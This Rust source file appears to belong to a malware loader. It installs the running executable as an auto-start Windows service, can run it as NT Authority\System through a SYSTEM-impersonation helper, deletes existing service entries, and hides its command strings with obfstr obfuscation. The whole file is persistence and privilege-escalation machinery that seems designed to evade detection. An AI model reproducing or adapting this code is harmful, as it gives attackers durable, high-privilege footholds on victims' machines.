use std::{ path::PathBuf, process::Output };
use anyhow::{ Context, Result };
use loader_vars::constants::{
    loader_service_description,
    loader_service_display_name,
    loader_service_name,
};
use obfstr::obfstr as s;
use shared::{
    uac::impersonate_system::execute_file_as_system,
    utils::functions::{ call_cmd, get_current_exe, system32_dir },
};
use std::ffi::OsString;
use windows_service::{
    service::{ ServiceAccess, ServiceErrorControl, ServiceInfo, ServiceStartType, ServiceType },
    service_manager::{ ServiceManager, ServiceManagerAccess },
};

pub const SERVICE_TYPE: ServiceType = ServiceType::OWN_PROCESS;

pub enum ServiceInstallState {
    DoesntExist,
    ExistsDiffExe,
    ExistsSameExe,
    ExistsErr,
}

pub fn get_service_install_state(
    service_name: &str,
    exe_path: &str
) -> Result<(ServiceInstallState, Option<String>)> {
    let output = call_cmd(&format!("{}{}", s!("sc qc "), service_name))?;

    let output_str = String::from_utf8_lossy(&output.stdout);

    if
        output_str.contains(s!("The specified service does not exist as an installed service")) ||
        output_str.contains(s!("OpenService FAILED 1060"))
    {
        return Ok((ServiceInstallState::DoesntExist, None));
    }

    let lines: Vec<&str> = output_str.split('\n').collect();

    for line in lines {
        if line.trim().starts_with(s!("BINARY_PATH_NAME")) {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() > 1 {
                let path = parts[1..].join(":");
                let service_exe_path = path.trim();
                if service_exe_path == exe_path {
                    return Ok((
                        ServiceInstallState::ExistsSameExe,
                        Some(service_exe_path.to_owned()),
                    ));
                } else {
                    return Ok((
                        ServiceInstallState::ExistsDiffExe,
                        Some(service_exe_path.to_owned()),
                    ));
                    // exist but doesnt match
                }
            }
        }
    }
    return Ok((
        ServiceInstallState::ExistsErr,
        Some(s!("SERVICE NOR EXISTS NOR BINARY FOUND: ").to_owned()),
    ));
}
pub fn delete_service(service_name: &str) -> Result<Output> {
    let command = format!("{}{}{}", s!("sc delete "), service_name, s!("/force /noconfirm"));
    call_cmd(&command)
}
pub fn delete_system_service(service_name: &str) -> Result<()> {
    let command = format!("{}{}{}", s!("sc delete "), service_name, s!("/force /noconfirm"));
    execute_file_as_system(s!("sc"), Some(&command), false)
}

pub fn install_initial_service() -> Result<()> {
    let service_name = loader_service_name();
    let exe_path = get_current_exe();
    let (state, service_exe_path) = get_service_install_state(
        &service_name,
        exe_path.to_str().unwrap()
    )?;
    match state {
        ServiceInstallState::DoesntExist => {}
        ServiceInstallState::ExistsDiffExe => {
            if let Some(path) = service_exe_path {
                if PathBuf::from(path).starts_with(system32_dir()) {
                    return Ok(());
                }
            }
            delete_service(&service_name)?;
        }
        ServiceInstallState::ExistsSameExe => {
            return Ok(());
        }
        ServiceInstallState::ExistsErr => {
            delete_service(&service_name)?;
        }
    }

    install_service(
        service_name,
        loader_service_display_name(),
        loader_service_description(),
        exe_path,
        None
    )
}

// this is only called after cleanup - update installations is for later
pub fn install_system_service() -> Result<()> {
    let service_name = loader_service_name();
    let exe_path = get_current_exe();
    let (state, service_exe_path) = get_service_install_state(
        &service_name,
        exe_path.to_str().unwrap()
    )?;
    match state {
        ServiceInstallState::DoesntExist => {}
        ServiceInstallState::ExistsDiffExe => {
            if let Some(path) = service_exe_path {
                if PathBuf::from(path).starts_with(system32_dir()) {
                    // service that is installed from system folder CANNOT be non trusted installer
                    // so if from that folder we assume its fine
                    return Ok(());
                }
            }
            delete_service(&service_name)?;
        }
        ServiceInstallState::ExistsSameExe => {
            // install_system_service can only be called IF we running from systemdir so its fine
            return Ok(());
        }
        ServiceInstallState::ExistsErr => {
            delete_service(&service_name)?;
        }
    }

    install_service(
        service_name,
        loader_service_display_name(),
        loader_service_description(),
        exe_path,
        Some(OsString::from(s!(r"NT Authority\System"))) // trusted installer
    )
}

pub fn install_service(
    service_name: String,
    service_display_name: String,
    service_description: String,
    exe_path: PathBuf,
    account_name: Option<OsString>
) -> Result<()> {
    let manager_access = ServiceManagerAccess::CONNECT | ServiceManagerAccess::CREATE_SERVICE;
    let service_manager = ServiceManager::local_computer(None::<&str>, manager_access).context(
        s!("Failed to connect to service manager").to_string()
    )?;

    let service_info = ServiceInfo {
        name: OsString::from(service_name),
        display_name: OsString::from(service_display_name),
        service_type: ServiceType::OWN_PROCESS,
        start_type: ServiceStartType::AutoStart,
        error_control: ServiceErrorControl::Ignore,
        executable_path: exe_path,
        launch_arguments: vec![],
        dependencies: vec![],
        account_name,
        account_password: None,
    };

    let service = service_manager
        .create_service(&service_info, ServiceAccess::CHANGE_CONFIG)
        .context(s!("Failed to create service").to_string())?;

    service
        .set_description(service_description)
        .context(s!("Failed to set service description").to_string())?;

    Ok(())
}
